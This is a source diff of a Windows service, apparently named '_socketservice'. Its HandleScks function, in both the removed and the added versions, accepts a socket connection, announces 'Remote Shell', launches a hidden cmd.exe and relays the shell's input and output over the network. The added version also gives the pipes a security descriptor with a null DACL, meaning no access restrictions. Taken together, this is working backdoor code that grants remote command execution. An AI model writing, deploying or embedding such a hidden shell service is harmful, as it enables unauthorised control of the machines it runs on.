@@ -20,6 +20,9 @@ bool SHOW_ERRORS = true;
 bool SHOW_ERRORS = false;
 #endif
 
+const DWORD RET_ERROR = -1;
+const DWORD RET_SUCCESS = 0;
+
 #ifdef UNICODE
 const LPWSTR SVC_NAME = L"_socketservice";
 #else    
@@ -40,6 +43,38 @@ int _MainFunction(int argc, char* argv[]);
 long Continue();
 long Pause();
 long Stop();
+
+
+
+#define bzero(a) memset(a,0,sizeof(a)) //easier -- shortcut
+
+bool IsWinNT()  //check if we're running NT
+{
+  OSVERSIONINFO osv;
+  osv.dwOSVersionInfoSize = sizeof(osv);
+  GetVersionEx(&osv);
+  return (osv.dwPlatformId == VER_PLATFORM_WIN32_NT);
+}
+
+void ErrorMessage(char *str)  //display detailed error info
+{
+  LPVOID msg;
+  FormatMessage(
+    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
+    NULL,
+    GetLastError(),
+    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
+    (LPTSTR) &msg,
+    0,
+    NULL
+  );
+  LOG_ERROR("svcmain::%s","%s",(char*)str,(char*)msg);
+  //printf("%s: %s\n",(char*)str,(char*)msg);
+  LocalFree(msg);
+}
+
+
+
 void StartInBackground()
 {
     LOG_INFO("ccc-service::StartInBackground", "StartInBackground");
@@ -87,104 +122,144 @@ void main()
     StartServiceCtrlDispatcher(ServiceTable);  
 }
 
-//The Main Thread (Handles the Pipes)
+
+//----------------------------EOF--------------------------------------------
+//---------------------------------------------------------------------------
 DWORD WINAPI HandleScks(LPVOID lpParam)
 {
-   //Variable Decle
-   SOCKET theSck = (SOCKET)lpParam;
-   HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
-   SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, true};
-   STARTUPINFO si;
-   PROCESS_INFORMATION pi;
-   DWORD stuff;
-   char buff[1000], recvBuff[5];
-   bool firstsend;
-   int offset = 0, bRecv;
-    
-   //Send socket some info
-   if(send(theSck, "Remote Shell\r\n\r\n", sizeof("Remote Shell\r\n\r\n"), 0) == SOCKET_ERROR) goto closeSck;
-    
-   //Create the main transfer pipe
-   if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
-       send(theSck, "Error Creating Pipes For Remote Shell\r\nClosing Connection...", 60, 0);
-       goto closeSck;
-   }
-    
-   //Get Process Startup Info
-   GetStartupInfo(&si);
-   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-   si.wShowWindow = SW_HIDE;
-   si.hStdOutput = stdoutWr;
-   si.hStdError = stdoutWr;                                                                                               
-   si.hStdInput = stdinRd;
-#ifdef UNICODE
-   if(!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
-       send(theSck, "Error Spawning Command Prompt. \r\nClosing Connection...", 52, 0);
-       goto closeSck;
-   }
-#else    
-   if(!CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
-       send(theSck, "Error Spawning Command Prompt. \r\nClosing Connection...", 52, 0);
-       goto closeSck;
-   }
-#endif
-   //Create the CMD Shell using the process startup info above
+  char buf[1024];           //i/o buffer
 
-    
-   //Main while(1) Loop
-   while(1) 
-   {
-       Sleep(100);
-       //Check if cmd.exe has not stoped
-       GetExitCodeProcess(pi.hProcess, &stuff);
-       //Stop the while loop if not active
-       if(stuff != STILL_ACTIVE) break;
-        
-       //Copy Data from buffer to pipe and vise versa
-       PeekNamedPipe(stdoutRd, NULL, 0, NULL, &stuff, NULL);
-       if(stuff != 0) 
-       {
-       //Zero buffer meomry
-       ZeroMemory(buff, sizeof(buff));
-       firstsend = true;
-        
-       do {
+  SOCKET theSck = (SOCKET)lpParam;
 
-               ReadFile(stdoutRd, (char*)buff, sizeof(buff), &stuff, NULL);
-               int bytes = 0;
-               LOG_TRACE("ServiceMain", "ReadFile %s", buff);
-               if(firstsend) 
-               { 
-                   
-                   bytes = send(theSck, buff + offset, strlen(buff) - offset, 0);
-                   LOG_TRACE("ServiceMain::Send1", "sent %d bytes: \"%s\"", bytes, buff);
-                   firstsend = false; 
-               }
-               else {
-                   bytes = send(theSck, buff, strlen(buff), 0);
-                   LOG_TRACE("ServiceMain::Send2", "sent %d bytes: \"%s\"", bytes, buff);
-               }
-          } while(stuff == 1000);
-       }
-        
-       if(!strcmp(recvBuff, "\r\n")) offset = 0;
-       bRecv = recv(theSck, recvBuff, 1000, 0);
-       if((bRecv == 0) || (bRecv == SOCKET_ERROR)) break;
-       recvBuff[bRecv] = '\r\n';
-       //Read data from stream and pipe it to cmd.exe
-       WriteFile(stdinWr, (char*)recvBuff, strlen(recvBuff), &stuff, NULL);
-       offset = offset + bRecv;
-   }
+  int receivedBytes, sentBytes = 0;
+  STARTUPINFO si;
+  SECURITY_ATTRIBUTES sa;
+  SECURITY_DESCRIPTOR sd;               //security information for pipes
+  PROCESS_INFORMATION pi;
+  HANDLE newstdin,newstdout,read_stdout,write_stdin;  //pipe handles
+
+  //Send socket some info
+  if(send(theSck, "Remote Shell\r\n\r\n", sizeof("Remote Shell\r\n\r\n"), 0) == SOCKET_ERROR) goto closeSck;
     
-   //Cleaning up functions
-   closeSck:
-       TerminateProcess(pi.hProcess, 0);
-       CloseHandle(stdinRd);
-       CloseHandle(stdinWr);
-       CloseHandle(stdoutRd);
-       CloseHandle(stdoutWr);
-       closesocket(theSck);
-       return 0;
+
+  if (IsWinNT())        //initialize security descriptor (Windows NT)
+  {
+    InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
+    SetSecurityDescriptorDacl(&sd, true, NULL, false);
+    sa.lpSecurityDescriptor = &sd;
+  }
+  else sa.lpSecurityDescriptor = NULL;
+  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+  sa.bInheritHandle = true;         //allow inheritable handles
+
+  if (!CreatePipe(&newstdin,&write_stdin,&sa,0))   //create stdin pipe
+  {
+    ErrorMessage("CreatePipe");
+    return RET_ERROR;
+  }
+  if (!CreatePipe(&read_stdout,&newstdout,&sa,0))  //create stdout pipe
+  {
+    ErrorMessage("CreatePipe");
+    
+    CloseHandle(newstdin);
+    CloseHandle(write_stdin);
+    return RET_ERROR;
+  }
+
+  GetStartupInfo(&si);      //set startupinfo for the spawned process
+  /*
+  The dwFlags member tells CreateProcess how to make the process.
+  STARTF_USESTDHANDLES validates the hStd* members. STARTF_USESHOWWINDOW
+  validates the wShowWindow member.
+  */
+  si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
+  si.wShowWindow = SW_HIDE;
+  si.hStdOutput = newstdout;
+  si.hStdError = newstdout;     //set the new handles for the child process
+  si.hStdInput = newstdin;
+  char app_spawn[] = "c:\\Windows\\System32\\cmd.exe"; //sample, modify for your
+                                                     //system
+
+  //spawn the child process
+  if (!CreateProcess(app_spawn,NULL,NULL,NULL,TRUE,CREATE_NEW_CONSOLE,
+                     NULL,NULL,&si,&pi))
+  {
+    ErrorMessage("CreateProcess");
+    getch();
+    CloseHandle(newstdin);
+    CloseHandle(newstdout);
+    CloseHandle(read_stdout);
+    CloseHandle(write_stdin);
+    return RET_ERROR;
+  }
+
+  unsigned long exit=0;  //process exit code
+  unsigned long bread;   //bytes read
+  unsigned long avail;   //bytes available
+
+  bzero(buf);
+  for(;;)      //main program loop
+  {
+    Sleep(100);
+    GetExitCodeProcess(pi.hProcess,&exit);      //while the process is running
+    if (exit != STILL_ACTIVE)
+      break;
+    PeekNamedPipe(read_stdout,buf,1023,&bread,&avail,NULL);
+    //check to see if there is any data to read from stdout
+    if (bread != 0)
+    {
+      bzero(buf);
+      if (avail > 1023)
+      {
+        while (bread >= 1023)
+        {
+          ReadFile(read_stdout,buf,1023,&bread,NULL);  //read the stdout pipe
+          LOG_TRACE("HandleSocks2::1","%s",(char*)buf);
+          sentBytes = send(theSck, buf, strlen(buf), 0);
+          LOG_TRACE("HandleSocks2::send1","send %d bytes",sentBytes);
+          bzero(buf);
+        }
+
+      }
+      else {
+        ReadFile(read_stdout,buf,1023,&bread,NULL);
+        LOG_TRACE("HandleSocks2::2","%s",(char*)buf);
+        sentBytes = send(theSck, buf, strlen(buf), 0);
+        LOG_TRACE("HandleSocks2::send2","send %d bytes",sentBytes);
+      }
+    }
+    receivedBytes = recv(theSck, buf, sizeof(buf), 0);
+    if((receivedBytes == 0) || (receivedBytes == SOCKET_ERROR)) {
+      LOG_TRACE("HandleSocks2","receivedBytes %d break",receivedBytes);
+      break;
+    }
+    if (receivedBytes)      //check for user input.
+    {
+
+      LOG_TRACE("HandleSocks2","%c",*buf);
+      WriteFile(write_stdin,buf,receivedBytes,&bread,NULL); //send it to stdin
+      if (*buf == '\r') {
+        *buf = '\n';
+        LOG_TRACE("HandleSocks2","%c",(char)*buf);
+        WriteFile(write_stdin,buf,receivedBytes,&bread,NULL); //send an extra newline char,
+                                                  //if necessary
+      }
+    }
+  }
+
+  //Cleaning up functions
+  closeSck:
+    TerminateProcess(pi.hProcess, 0);
+    closesocket(theSck);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(newstdin);            //clean stuff up
+    CloseHandle(newstdout);
+    CloseHandle(read_stdout);
+    CloseHandle(write_stdin);
+
+  return RET_SUCCESS;
 }
 
 void ServiceMain(int argc, char** argv) 
@@ -415,7 +490,7 @@ int _MainFunction(int argc, char** argv)
         }
 
         //else its some IO operation on some other socket :)
-        for (i = 0; i < max_clients; i++)
+       /* for (i = 0; i < max_clients; i++)
         {
             s = client_socket[i];
             //if client presend in read sockets             
@@ -455,9 +530,7 @@ int _MainFunction(int argc, char** argv)
                     client_socket[i] = 0;
                 }
             }
-
-            
-        }
+        }*/
     }
 }
 
